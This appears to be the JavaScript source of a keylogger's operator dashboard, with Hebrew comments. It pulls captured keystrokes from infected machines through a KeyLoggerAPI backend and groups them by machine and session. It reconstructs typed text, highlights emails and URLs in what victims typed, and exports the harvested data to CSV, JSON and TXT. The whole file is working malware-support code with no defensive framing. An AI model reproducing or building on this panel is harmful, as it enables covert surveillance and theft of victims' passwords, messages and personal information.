// משתנים גלובליים
let allData = [];
let filteredData = [];
let machines = [];
let currentPage = 1;
const itemsPerPage = 100; // Show more items per page
let dataModal = null;
let viewMode = "readable"; // "readable" or "raw"

$(document).ready(function () {
  // אתחול בוחר התאריכים
  $(".datepicker").datepicker({
    format: "yyyy-mm-dd",
    autoclose: true,
    todayHighlight: true,
    rtl: true,
    language: "he",
  });
});

// בדיקת אימות וטעינת דף
document.addEventListener("DOMContentLoaded", function () {
  // בדיקה שהמשתמש מחובר
  if (!checkAuth()) return;

  // אתחול המודאל
  dataModal = new bootstrap.Modal(document.getElementById("dataViewModal"));

  // טעינת נתונים
  loadData();

  // הגדרת אירועי לחיצה
  initializeEvents();

  // הצגת שם המשתמש
  const userData = KeyLoggerAPI.getCurrentUser();
  if (userData) {
    document.getElementById("user-name").textContent = userData.userId;
  }

  // בדיקה אם יש פרמטר מחשב ב-URL
  const machineId = getUrlParam("machine");
  if (machineId) {
    // הגדרת המחשב הנבחר אחרי טעינת הנתונים
    setTimeout(() => {
      document.getElementById("machine-filter").value = machineId;
      document.getElementById("apply-filters").click();
    }, 500);
  }

  // בדיקה אם יש הרשאות מנהל (למטרות תצוגה בלבד)
  checkAdminPermissions();
});

// בדיקת הרשאות מנהל
async function checkAdminPermissions() {
  try {
    const response = await KeyLoggerAPI.fetchWithAuth("/api/agents");

    if (response && response.ok) {
      // למשתמש יש הרשאות מנהל
      document
        .querySelectorAll(".admin-only")
        .forEach((el) => (el.style.display = "block"));
    }
  } catch (error) {
    console.error("Admin check error:", error);
  }
}

// טעינת נתונים
async function loadData() {
  // הצגת מסך טעינה
  document.getElementById("data-loading").style.display = "block";
  document.getElementById("data-empty").style.display = "none";
  document.getElementById("data-error").style.display = "none";
  document.getElementById("data-container").style.display = "none";

  showLoading(true);

  try {
    // טעינת נתונים
    allData = (await KeyLoggerAPI.get("/api/data")) || [];

    // טעינת רשימת מחשבים
    await loadMachines();

    // איפוס סינון
    resetFilters();

    // הצגת הנתונים
    applyFilters();

    // עדכון זמן אחרון
    document.getElementById(
      "last-update"
    ).textContent = `עודכן לאחרונה: ${new Date().toLocaleTimeString()}`;
  } catch (error) {
    console.error("Error loading data:", error);
    document.getElementById("data-loading").style.display = "none";
    document.getElementById("data-error").style.display = "block";
    showNotification("שגיאת טעינה", "אירעה שגיאה בטעינת הנתונים", "error");
  } finally {
    showLoading(false);
  }
}

// טעינת רשימת מחשבים
async function loadMachines() {
  try {
    machines = await KeyLoggerAPI.get("/api/machine");

    if (machines) {
      // מילוי תיבת הבחירה של מחשבים
      const machineSelect = document.getElementById("machine-filter");
      machineSelect.innerHTML = '<option value="">כל המחשבים</option>';

      machines.forEach((machine) => {
        const option = document.createElement("option");
        option.value = machine.id;
        option.textContent = machine.name || machine.info?.pc_name || "ללא שם";
        machineSelect.appendChild(option);
      });
    }
  } catch (error) {
    console.error("Error loading machines:", error);
    showNotification(
      "שגיאת טעינה",
      "אירעה שגיאה בטעינת רשימת המחשבים",
      "warning"
    );
  }
}

// איפוס סינונים
function resetFilters() {
  document.getElementById("machine-filter").value = "";
  document.getElementById("date-from").value = "";
  document.getElementById("date-to").value = "";
  document.getElementById("text-search").value = "";
}

// החלת סינונים
function applyFilters() {
  const machineId = document.getElementById("machine-filter").value;
  const dateFrom = document.getElementById("date-from").value;
  const dateTo = document.getElementById("date-to").value;
  const searchText = document.getElementById("text-search").value.toLowerCase();

  // המרת תאריכים לאובייקטי Date
  const fromDate = dateFrom ? new Date(dateFrom) : null;
  const toDate = dateTo ? new Date(dateTo) : null;
  if (toDate) {
    // הגדרת השעה ל-23:59:59 כדי לכלול את כל היום
    toDate.setHours(23, 59, 59, 999);
  }

  showLoading(true);

  // סינון הנתונים
  filteredData = allData.filter((item) => {
    // סינון לפי מחשב
    if (machineId && item.machine_id !== machineId) {
      return false;
    }

    // סינון לפי תאריכים
    const itemDate = new Date(item.timestamp * 1000);
    if (fromDate && itemDate < fromDate) {
      return false;
    }
    if (toDate && itemDate > toDate) {
      return false;
    }

    // סינון לפי טקסט
    if (searchText && !item.data.toLowerCase().includes(searchText)) {
      return false;
    }

    return true;
  });

  // מיון הנתונים לפי תאריך (מהחדש לישן)
  filteredData.sort(
    (a, b) => new Date(b.timestamp * 1000) - new Date(a.timestamp * 1000)
  );

  // איפוס העמוד הנוכחי
  currentPage = 1;

  // הצגת הנתונים המסוננים
  renderData();

  showLoading(false);
}

// עיבוד נתונים לקבוצות
function processDataIntoGroups(data) {
  const groups = [];
  let currentGroup = null;

  data.forEach((item) => {
    const timestamp = new Date(item.timestamp * 1000);
    const machine = machines.find((m) => m.id === item.machine_id);
    const machineName = machine
      ? machine.name || machine.info?.pc_name || item.machine_id
      : item.machine_id;

    // בדיקה אם להתחיל קבוצה חדשה
    if (
      !currentGroup ||
      currentGroup.machine_id !== item.machine_id ||
      timestamp - new Date(currentGroup.lastTimestamp) > 60000 // 1 דקה הפרש
    ) {
      if (currentGroup) {
        // אם יש קבוצה קודמת, נוסיף אותה רק אם יש בה תוכן משמעותי
        if (currentGroup.data.length > 0) {
          groups.push(currentGroup);
        }
      }

      currentGroup = {
        machine_id: item.machine_id,
        machineName: machineName,
        startTime: timestamp,
        lastTimestamp: item.timestamp * 1000,
        data: [],
        keyCount: 0,
      };
    }

    // הוספת נתונים לקבוצה הנוכחית
    if (item.data && item.data.length > 0) {
      if (currentGroup.data.length > 0) {
        // אם יש כבר נתונים בקבוצה, נוסיף רווח
        currentGroup.data.push({ ...item, data: [" ", ...item.data] });
      } else {
        currentGroup.data.push(item);
      }
      currentGroup.lastTimestamp = item.timestamp * 1000;
      currentGroup.keyCount += item.data.length;
    }
  });

  // הוספת הקבוצה האחרונה
  if (currentGroup && currentGroup.data.length > 0) {
    groups.push(currentGroup);
  }

  return groups;
}

// פונקציה לשחזור טקסט קריא מהקשות מקלדת
function reconstructText(keystrokes) {
  if (!keystrokes || !Array.isArray(keystrokes)) return "";

  let text = "";
  let cursorPos = 0;

  for (const key of keystrokes) {
    // Handle special keys
    if (key.startsWith("<") && key.endsWith(">")) {
      const keyName = key.slice(1, -1).toLowerCase();

      switch (keyName) {
        case "backspace":
          if (cursorPos > 0) {
            text = text.substring(0, cursorPos - 1) + text.substring(cursorPos);
            cursorPos = Math.max(0, cursorPos - 1);
          }
          break;
        case "delete":
          if (cursorPos < text.length) {
            text = text.substring(0, cursorPos) + text.substring(cursorPos + 1);
          }
          break;
        case "left":
          cursorPos = Math.max(0, cursorPos - 1);
          break;
        case "right":
          cursorPos = Math.min(text.length, cursorPos + 1);
          break;
        case "home":
          cursorPos = 0;
          break;
        case "end":
          cursorPos = text.length;
          break;
        case "enter":
        case "return":
          text =
            text.substring(0, cursorPos) + "\n" + text.substring(cursorPos);
          cursorPos++;
          break;
        case "tab":
          text =
            text.substring(0, cursorPos) + "    " + text.substring(cursorPos);
          cursorPos += 4;
          break;
        // Ignore other special keys like F1-F12, etc.
      }
    }
    // Handle key combinations (e.g., Shift+A)
    else if (key.includes("+")) {
      const parts = key.split("+");
      const mainKey = parts[0];

      // Only add the main key if it's not a modifier or special key
      if (mainKey && !mainKey.startsWith("<") && mainKey.length === 1) {
        text =
          text.substring(0, cursorPos) + mainKey + text.substring(cursorPos);
        cursorPos++;
      }
    }
    // Regular characters
    else if (key.length === 1) {
      text = text.substring(0, cursorPos) + key + text.substring(cursorPos);
      cursorPos++;
    }
  }

  // Format the reconstructed text for display
  return text.replace(/\n/g, "<br>");
}

// עיבוד טקסט עם הדגשת מקשים מיוחדים
function processSpecialKeys(data) {
  if (!data || !Array.isArray(data)) return "";

  return data
    .map((key) => {
      // Handle key combinations (e.g., <ctrl>+\u05dc)
      if (key.includes("+")) {
        const parts = key.split("+");
        let displayText = "";

        // Process each part of the combination
        parts.forEach((part, index) => {
          if (part === "<ctrl>" || part === "<ctrl_r>") {
            displayText +=
              '<span class="special-key"><i class="fas fa-keyboard"></i> Ctrl</span>';
          } else if (part === "<shift>" || part === "<shift_r>") {
            displayText +=
              '<span class="special-key"><i class="fas fa-arrow-up"></i> Shift</span>';
          } else if (part === "<alt>" || part === "<alt_r>") {
            displayText +=
              '<span class="special-key"><i class="fas fa-exchange-alt"></i> Alt</span>';
          } else if (part !== "None") {
            // Regular key or Hebrew character
            displayText += `<span class="key-press">${part}</span>`;
          }

          // Add + between parts, but not after the last part
          if (index < parts.length - 1 && parts[index + 1] !== "None") {
            displayText += " + ";
          }
        });

        return displayText;
      }

      // Handle single special keys
      if (key.startsWith("<") && key.endsWith(">")) {
        const keyName = key.slice(1, -1);
        switch (keyName.toLowerCase()) {
          case "f5":
            return '<span class="special-key"><i class="fas fa-sync"></i> F5</span>';
          case "f12":
            return '<span class="special-key"><i class="fas fa-terminal"></i> F12</span>';
          case "tab":
            return '<span class="special-key"><i class="fas fa-arrow-right"></i> Tab</span>';
          case "enter":
          case "return":
            return '<span class="special-key"><i class="fas fa-level-down-alt fa-rotate-90"></i> Enter</span>';
          case "backspace":
            return '<span class="special-key"><i class="fas fa-backspace"></i> Backspace</span>';
          case "delete":
            return '<span class="special-key"><i class="fas fa-times"></i> Delete</span>';
          case "left":
            return '<span class="special-key"><i class="fas fa-arrow-left"></i> Left</span>';
          case "right":
            return '<span class="special-key"><i class="fas fa-arrow-right"></i> Right</span>';
          case "up":
            return '<span class="special-key"><i class="fas fa-arrow-up"></i> Up</span>';
          case "down":
            return '<span class="special-key"><i class="fas fa-arrow-down"></i> Down</span>';
          case "home":
            return '<span class="special-key"><i class="fas fa-home"></i> Home</span>';
          case "end":
            return '<span class="special-key"><i class="fas fa-angle-double-right"></i> End</span>';
          default:
            return `<span class="special-key">${keyName}</span>`;
        }
      }

      // Regular characters (including Hebrew)
      return `<span class="key-press">${key}</span>`;
    })
    .join(" ");
}

// זיהוי סוג האפליקציה
function getAppClass(windowTitle) {
  const title = windowTitle.toLowerCase();
  if (title.includes("chrome")) return "app-chrome";
  if (title.includes("firefox")) return "app-firefox";
  if (title.includes("edge")) return "app-edge";
  if (title.includes("code") || title.includes("visual studio"))
    return "app-vscode";
  if (title.includes("word")) return "app-word";
  if (title.includes("excel")) return "app-excel";
  if (title.includes("powerpoint")) return "app-powerpoint";
  if (title.includes("outlook")) return "app-outlook";
  if (title.includes("teams")) return "app-teams";
  if (title.includes("slack")) return "app-slack";
  if (
    title.includes("terminal") ||
    title.includes("cmd") ||
    title.includes("powershell")
  )
    return "app-terminal";
  return "app-other";
}

// הצגת הנתונים בתצוגה מורחבת
function renderData() {
  // הסתרת מסך טעינה
  document.getElementById("data-loading").style.display = "none";

  if (filteredData.length === 0) {
    // אין נתונים
    document.getElementById("data-empty").style.display = "block";
    document.getElementById("data-container").style.display = "none";
    return;
  }

  // הצגת נתונים
  document.getElementById("data-empty").style.display = "none";
  document.getElementById("data-container").style.display = "block";

  // חישוב טווח העמוד הנוכחי
  const startIndex = (currentPage - 1) * itemsPerPage;
  const endIndex = Math.min(startIndex + itemsPerPage, filteredData.length);
  const currentPageData = filteredData.slice(startIndex, endIndex);

  // עדכון טווח הפריטים המוצגים
  document.getElementById("items-range").textContent = `${
    startIndex + 1
  }-${endIndex}`;
  document.getElementById("total-items").textContent = filteredData.length;

  // עיבוד הנתונים לקבוצות
  const groups = processDataIntoGroups(currentPageData);

  // מילוי הנתונים
  const container = document.getElementById("log-entries");
  container.innerHTML = "";

  groups.forEach((group, index) => {
    const duration = new Date(group.lastTimestamp) - group.startTime;
    const minutes = Math.floor(duration / 60000);
    const seconds = Math.floor((duration % 60000) / 1000);

    const logEntry = document.createElement("div");
    logEntry.className = `log-entry ${getAppClass(group.machineName)}`;
    logEntry.innerHTML = `
      <div class="log-entry-header">
        <i class="fas fa-chevron-right collapse-icon"></i>
        <div class="app-icon">
          ${getOSIcon(machines.find((m) => m.machine_id === group.machine_id))}
        </div>
        <div class="log-entry-title">
          <strong>${group.machineName}</strong>
          <small class="text-muted d-block">${group.machine_id}</small>
        </div>
        <div class="log-entry-meta">
          <span>${formatDate(group.startTime)}</span>
          <span>${group.keyCount} הקשות</span>
          <span>${minutes} דקות, ${seconds} שניות</span>
        </div>
      </div>
      <div class="log-entry-content">
        ${
          viewMode === "raw"
            ? `<div class="keystroke-container">${group.data
                .map((item) => processSpecialKeys(item.data))
                .join("")}</div>`
            : `<div class="readable-text">${group.data
                .map((item) => reconstructText(item.data))
                .join("")}</div>`
        }
      </div>
    `;

    container.appendChild(logEntry);
  });

  // הגדרת אירועי לחיצה
  document.querySelectorAll(".log-entry-header").forEach((header) => {
    header.addEventListener("click", function () {
      const entry = this.closest(".log-entry");
      entry.classList.toggle("expanded");
    });
  });

  // הגדרת אירועי כפתורי הרחבה/כיווץ
  document
    .getElementById("expand-all-btn")
    .addEventListener("click", function () {
      document
        .querySelectorAll(".log-entry")
        .forEach((entry) => entry.classList.add("expanded"));
    });

  document
    .getElementById("collapse-all-btn")
    .addEventListener("click", function () {
      document
        .querySelectorAll(".log-entry")
        .forEach((entry) => entry.classList.remove("expanded"));
    });

  // יצירת דפי ניווט
  renderPagination();
}

// יצירת דפי ניווט
function renderPagination() {
  const totalPages = Math.ceil(filteredData.length / itemsPerPage);
  const pagination = document.getElementById("pagination");
  pagination.innerHTML = "";

  // דף קודם
  const prevLi = document.createElement("li");
  prevLi.className = `page-item ${currentPage === 1 ? "disabled" : ""}`;
  prevLi.innerHTML = `
                <a class="page-link" href="#" aria-label="Previous">
                    <span aria-hidden="true">&laquo;</span>
                </a>
            `;

  prevLi.addEventListener("click", function (e) {
    e.preventDefault();
    if (currentPage > 1) {
      currentPage--;
      renderData();
    }
  });

  pagination.appendChild(prevLi);

  // מספרי עמודים
  const maxPagesToShow = 5;
  let startPage = Math.max(1, currentPage - Math.floor(maxPagesToShow / 2));
  let endPage = Math.min(totalPages, startPage + maxPagesToShow - 1);

  if (endPage - startPage + 1 < maxPagesToShow) {
    startPage = Math.max(1, endPage - maxPagesToShow + 1);
  }

  for (let i = startPage; i <= endPage; i++) {
    const pageLi = document.createElement("li");
    pageLi.className = `page-item ${i === currentPage ? "active" : ""}`;
    pageLi.innerHTML = `<a class="page-link" href="#">${i}</a>`;

    pageLi.addEventListener("click", function (e) {
      e.preventDefault();
      currentPage = i;
      renderData();
    });

    pagination.appendChild(pageLi);
  }

  // דף הבא
  const nextLi = document.createElement("li");
  nextLi.className = `page-item ${
    currentPage === totalPages ? "disabled" : ""
  }`;
  nextLi.innerHTML = `
                <a class="page-link" href="#" aria-label="Next">
                    <span aria-hidden="true">&raquo;</span>
                </a>
            `;

  nextLi.addEventListener("click", function (e) {
    e.preventDefault();
    if (currentPage < totalPages) {
      currentPage++;
      renderData();
    }
  });

  pagination.appendChild(nextLi);
}

// קבלת אייקון מערכת הפעלה
function getOSIcon(machine) {
  if (!machine || !machine.info || !machine.info.system) {
    return '<i class="fas fa-desktop"></i>';
  }

  const osName = machine.info.system.os_name?.toLowerCase() || "";

  if (osName.includes("windows")) {
    return '<i class="fab fa-windows"></i>';
  } else if (osName.includes("mac") || osName.includes("darwin")) {
    return '<i class="fab fa-apple"></i>';
  } else if (osName.includes("linux")) {
    return '<i class="fab fa-linux"></i>';
  } else {
    return '<i class="fas fa-desktop"></i>';
  }
}

// פורמט תאריך ושעה
function formatDate(date) {
  if (!date) return "";

  // בדיקה אם התאריך הוא מהיום
  const today = new Date();
  const isToday =
    date.getDate() === today.getDate() &&
    date.getMonth() === today.getMonth() &&
    date.getFullYear() === today.getFullYear();

  // פורמט שעה
  const hours = date.getHours().toString().padStart(2, "0");
  const minutes = date.getMinutes().toString().padStart(2, "0");
  const seconds = date.getSeconds().toString().padStart(2, "0");
  const timeStr = `${hours}:${minutes}:${seconds}`;

  // אם זה היום, נציג רק את השעה
  if (isToday) {
    return `<span class="time-display">${timeStr}</span>`;
  }

  // אחרת, נציג תאריך ושעה
  const day = date.getDate().toString().padStart(2, "0");
  const month = (date.getMonth() + 1).toString().padStart(2, "0");
  const year = date.getFullYear();

  return `<span class="date-display">${day}/${month}/${year}</span> <span class="time-display">${timeStr}</span>`;
}

// ניתוח תוכן הנתונים
function analyzeData(data) {
  const analysis = document.getElementById("modal-data-analysis");

  // ספירת תווים
  const charCount = data.length;

  // ספירת מילים
  const wordCount = data.split(/\s+/).filter((word) => word.length > 0).length;

  // ספירת שורות
  const lineCount = data.split(/\r\n|\r|\n/).length;

  // זיהוי מספרים
  const numbers = data.match(/\d+/g) || [];

  // זיהוי דוא"ל
  const emails =
    data.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g) || [];

  // זיהוי כתובות אינטרנט
  const urls = data.match(/https?:\/\/[^\s]+/g) || [];

  // מילוי הניתוח
  analysis.innerHTML = `
                <div class="row mb-3">
                    <div class="col-md-4">
                        <div class="card">
                            <div class="card-body py-2 text-center">
                                <h3 class="mb-0">${charCount}</h3>
                                <div class="text-muted">תווים</div>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-4">
                        <div class="card">
                            <div class="card-body py-2 text-center">
                                <h3 class="mb-0">${wordCount}</h3>
                                <div class="text-muted">מילים</div>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-4">
                        <div class="card">
                            <div class="card-body py-2 text-center">
                                <h3 class="mb-0">${lineCount}</h3>
                                <div class="text-muted">שורות</div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="card">
                    <div class="card-header">
                        <h6 class="mb-0">זוהו בתוכן</h6>
                    </div>
                    <div class="card-body">
                        <div class="d-flex flex-wrap gap-2">
                            ${
                              numbers.length > 0
                                ? `<span class="badge bg-info">${numbers.length} מספרים</span>`
                                : ""
                            }
                            ${
                              emails.length > 0
                                ? `<span class="badge bg-warning">${emails.length} כתובות דוא"ל</span>`
                                : ""
                            }
                            ${
                              urls.length > 0
                                ? `<span class="badge bg-success">${urls.length} כתובות אינטרנט</span>`
                                : ""
                            }
                            ${
                              numbers.length === 0 &&
                              emails.length === 0 &&
                              urls.length === 0
                                ? '<span class="text-muted">לא זוהו פריטים מיוחדים</span>'
                                : ""
                            }
                        </div>
                    </div>
                </div>
            `;
}

// פונקציית העתקה ללוח
function copyToClipboard(text, button) {
  // יצירת אלמנט זמני
  const tempElement = document.createElement("textarea");
  tempElement.value = text;
  document.body.appendChild(tempElement);

  // בחירת הטקסט והעתקה
  tempElement.select();
  document.execCommand("copy");

  // הסרת האלמנט הזמני
  document.body.removeChild(tempElement);

  // עדכון כפתור ההעתקה
  const originalHTML = button.innerHTML;
  button.innerHTML = '<i class="fas fa-check"></i> הועתק';

  // החזרת הכפתור למצב הרגיל אחרי 2 שניות
  setTimeout(() => {
    button.innerHTML = originalHTML;
  }, 2000);
}

// אתחול אירועים
function initializeEvents() {
  // אירוע התנתקות
  document
    .getElementById("logout-link")
    .addEventListener("click", function (e) {
      e.preventDefault();
      KeyLoggerAPI.logout();
    });

  // החלת סינון
  document
    .getElementById("apply-filters")
    .addEventListener("click", function () {
      applyFilters();
    });

  // ניקוי סינון
  document
    .getElementById("clear-filters")
    .addEventListener("click", function () {
      resetFilters();
      applyFilters();
    });

  // ניסיון מחדש במקרה של שגיאה
  document
    .getElementById("error-refresh-btn")
    .addEventListener("click", function () {
      loadData();
    });

  // אירועי ייצוא
  document.getElementById("export-csv").addEventListener("click", function (e) {
    e.preventDefault();
    exportToCSV(
      filteredData,
      `keylogger_data_${new Date().toISOString().slice(0, 10)}.csv`
    );
  });

  document
    .getElementById("export-json")
    .addEventListener("click", function (e) {
      e.preventDefault();

      if (filteredData.length === 0) {
        showNotification("ייצוא נכשל", "אין נתונים לייצוא", "warning");
        return;
      }

      const exportData = filteredData.map((item) => {
        const machine = machines.find((m) => m.id === item.machine_id);
        const machineName = machine
          ? machine.name || machine.info?.pc_name || item.machine_id
          : item.machine_id;

        return {
          timestamp: item.timestamp,
          machine_id: item.machine_id,
          machine_name: machineName,
          data: item.data,
        };
      });

      const jsonContent =
        "data:text/json;charset=utf-8," +
        encodeURIComponent(JSON.stringify(exportData, null, 2));

      const link = document.createElement("a");
      link.setAttribute("href", jsonContent);
      link.setAttribute(
        "download",
        `keylogger_data_${new Date().toISOString().slice(0, 10)}.json`
      );
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);

      showNotification("ייצוא הושלם", "הנתונים יוצאו בהצלחה", "success");
    });

  document.getElementById("export-txt").addEventListener("click", function (e) {
    e.preventDefault();

    if (filteredData.length === 0) {
      showNotification("ייצוא נכשל", "אין נתונים לייצוא", "warning");
      return;
    }

    let textContent = "";

    filteredData.forEach((item) => {
      const date = formatDate(new Date(item.timestamp * 1000));
      const machine = machines.find((m) => m.id === item.machine_id);
      const machineName = machine
        ? machine.name || machine.info?.pc_name || item.machine_id
        : item.machine_id;

      textContent += `=== ${date} | ${machineName} ===\n${item.data}\n\n`;
    });

    const encodedText =
      "data:text/plain;charset=utf-8," + encodeURIComponent(textContent);

    const link = document.createElement("a");
    link.setAttribute("href", encodedText);
    link.setAttribute(
      "download",
      `keylogger_data_${new Date().toISOString().slice(0, 10)}.txt`
    );
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);

    showNotification("ייצוא הושלם", "הנתונים יוצאו בהצלחה", "success");
  });

  // אירוע חיפוש עם Enter
  document
    .getElementById("text-search")
    .addEventListener("keypress", function (e) {
      if (e.key === "Enter") {
        applyFilters();
      }
    });

  // אירועי מעבר בין תצוגות
  document
    .getElementById("view-readable-btn")
    .addEventListener("click", function () {
      if (viewMode !== "readable") {
        viewMode = "readable";
        this.classList.add("active");
        document.getElementById("view-raw-btn").classList.remove("active");
        renderData(); // רענון התצוגה
        showNotification("תצוגה שונתה", "מציג טקסט קריא", "info");
      }
    });

  document
    .getElementById("view-raw-btn")
    .addEventListener("click", function () {
      if (viewMode !== "raw") {
        viewMode = "raw";
        this.classList.add("active");
        document.getElementById("view-readable-btn").classList.remove("active");
        renderData(); // רענון התצוגה
        showNotification("תצוגה שונתה", "מציג הקשות גולמיות", "info");
      }
    });
}
